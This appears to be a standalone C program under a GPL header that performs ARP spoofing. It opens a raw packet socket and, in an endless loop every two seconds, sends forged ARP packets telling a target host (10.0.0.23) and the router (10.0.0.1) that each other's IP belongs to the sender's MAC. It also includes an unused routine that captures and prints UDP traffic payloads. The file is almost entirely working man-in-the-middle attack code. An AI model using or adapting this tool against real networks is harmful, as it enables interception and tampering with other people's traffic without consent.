/*
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 */

#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>
#include <net/if.h>
#include <netinet/ether.h>
#include "raw.h"

#define TARGET_MAC0	0xFF
#define TARGET_MAC1	0xFF
#define TARGET_MAC2	0xFF
#define TARGET_MAC3	0xFF
#define TARGET_MAC4	0xFF
#define TARGET_MAC5	0xFF

#define ETHER_TYPE	0x0806

#define DEFAULT_IF	"eth0"
#define BUF_SIZ		1518
#define PROTO_UDP 17


int recv_raw_udp(int socket, uint8_t *src_ip, uint16_t src_port, uint8_t *dst_ip, uint16_t dst_port, uint8_t *payload, uint16_t size)
{
	uint8_t raw_buffer[ETH_LEN];
	struct eth_frame_s *raw = (struct eth_frame_s *)&raw_buffer;
	while(1)
	{	
		int numbytes = recvfrom(socket, raw_buffer, ETH_LEN, 0, NULL, NULL);
		if (raw->ethernet.eth_type == ntohs(ETH_P_IP))
		{
			if(raw->ip.proto == PROTO_UDP)
			{
				src_ip = raw->ip.src;
				dst_ip = raw->ip.dst;
				dst_port = ntohs(raw->udp.dst_port);
				src_port = ntohs(raw->udp.src_port);
				payload = (char *)&raw->udp + sizeof(struct udp_hdr_s);
				printf("received UDP message\n");
				printf("Source port: %d ##### Destination port: %d", src_port, dst_port);
				printf("Source : %d.%d.%d.%d\n",raw->ip.src[0],raw->ip.src[1],raw->ip.src[2],raw->ip.src[3]);
				printf("Destination : %d.%d.%d.%d\n",raw->ip.dst[0],raw->ip.dst[1],raw->ip.dst[2],raw->ip.dst[3]);
				printf("message: %s\n", payload);
					//p = (char *)&raw->udp + ntohs(raw->udp.udp_len);
				//	*p = '\0';
				//	printf("src port: %d dst port: %d size: %d msg: %s", 
				//	ntohs(raw->udp.src_port), ntohs(raw->udp.dst_port),
				//	ntohs(raw->udp.udp_len), (char *)&raw->udp + sizeof(struct udp_hdr_s)
					
			}
		}
				continue;
	}
}


int main(int argc, char *argv[])
{
	int sockfd;
	struct ifreq if_idx;
	struct ifreq if_mac;
	int tx_len = 0;
	char sendbuf[BUF_SIZ];
	struct ether_header *eh = (struct ether_header *) sendbuf;
	struct iphdr *iph = (struct iphdr *) (sendbuf + sizeof(struct ether_header));
	struct sockaddr_ll socket_address;
	
	char ARP_header[8] = {0,1, 0x08, 0x00, 6, 4, 0 , 1};
	char router_ip[4] = {10, 0, 0, 1};
	char target_ip[4] = {10, 0, 0, 23};
	
	char ifName[IFNAMSIZ];
	
	/* Get interface name */
	if (argc > 1)
		strcpy(ifName, argv[1]);
	else
		strcpy(ifName, DEFAULT_IF);

	/* Open RAW socket to send on */
	if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETHER_TYPE))) == -1) {
	    perror("socket");
	}

	/* Get the index of the interface to send on */
	memset(&if_idx, 0, sizeof(struct ifreq));
	strncpy(if_idx.ifr_name, ifName, IFNAMSIZ-1);
	if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0)
	    perror("SIOCGIFINDEX");
	/* Get the MAC address of the interface to send on */
	memset(&if_mac, 0, sizeof(struct ifreq));
	strncpy(if_mac.ifr_name, ifName, IFNAMSIZ-1);
	if (ioctl(sockfd, SIOCGIFHWADDR, &if_mac) < 0)
	    perror("SIOCGIFHWADDR");

	/* Construct the Ethernet header */
	memset(sendbuf, 0, BUF_SIZ);
	/* Ethernet header */
	eh->ether_shost[0] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[0];
	eh->ether_shost[1] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[1];
	eh->ether_shost[2] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[2];
	eh->ether_shost[3] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[3];
	eh->ether_shost[4] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[4];
	eh->ether_shost[5] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[5];
	eh->ether_dhost[0] = TARGET_MAC0;
	eh->ether_dhost[1] = TARGET_MAC1;
	eh->ether_dhost[2] = TARGET_MAC2;
	eh->ether_dhost[3] = TARGET_MAC3;
	eh->ether_dhost[4] = TARGET_MAC4;
	eh->ether_dhost[5] = TARGET_MAC5;
	/* Ethertype field */
	eh->ether_type = htons(ETHER_TYPE);
	memcpy(sendbuf, eh, sizeof(struct ether_header));
	tx_len += sizeof(struct ether_header);

	/* ARP HEADER*/
	//sendbuf[tx_len++] = 0xde;
	//sendbuf[tx_len++] = 0xad;
	//sendbuf[tx_len++] = 0xbe;
	//sendbuf[tx_len++] = 0xef;
	memcpy(sendbuf + tx_len, ARP_header, sizeof(ARP_header));
	tx_len += sizeof(ARP_header);
	
	memcpy(sendbuf +tx_len, eh->ether_shost,6); //source MAC
	tx_len += 6;	
	while(1)
	{
		/*send to target */
		
		memcpy(sendbuf + tx_len, router_ip, 4); //source IP
		tx_len += 4;
		memset(sendbuf + tx_len, 0, 6); //dest MAC
		tx_len += 6;
		memcpy(sendbuf + tx_len, target_ip, 4); //dest IP
		tx_len += 4;
		/////////////////////////	
		/* Index of the network device */
		socket_address.sll_ifindex = if_idx.ifr_ifindex;
		/* Address length*/
		socket_address.sll_halen = ETH_ALEN;
		/* Destination MAC */
		socket_address.sll_addr[0] = TARGET_MAC0;
		socket_address.sll_addr[1] = TARGET_MAC1;
		socket_address.sll_addr[2] = TARGET_MAC2;
		socket_address.sll_addr[3] = TARGET_MAC3;
		socket_address.sll_addr[4] = TARGET_MAC4;
		socket_address.sll_addr[5] = TARGET_MAC5;

		/* Send packet */
		if (sendto(sockfd, sendbuf, tx_len, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
			printf("Send failed\n");


		tx_len -= 14;
		/*send to router */
		memcpy(sendbuf + tx_len, target_ip, 4); //source IP
		tx_len += 4;
		memset(sendbuf + tx_len, 0, 6); //dest MAC
		tx_len += 6;
		memcpy(sendbuf + tx_len, router_ip, 4); //dest IP
		tx_len += 4;
		
		/* Index of the network device */
		socket_address.sll_ifindex = if_idx.ifr_ifindex;
		/* Address length*/
		socket_address.sll_halen = ETH_ALEN;
		/* Destination MAC */
		socket_address.sll_addr[0] = TARGET_MAC0;
		socket_address.sll_addr[1] = TARGET_MAC1;
		socket_address.sll_addr[2] = TARGET_MAC2;
		socket_address.sll_addr[3] = TARGET_MAC3;
		socket_address.sll_addr[4] = TARGET_MAC4;
		socket_address.sll_addr[5] = TARGET_MAC5;
		
		
		if (sendto(sockfd, sendbuf, tx_len, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
			printf("Send failed\n");
		/////////////////////////
		tx_len -= 14;
		
		sleep(2);
	}
	return 0;
}
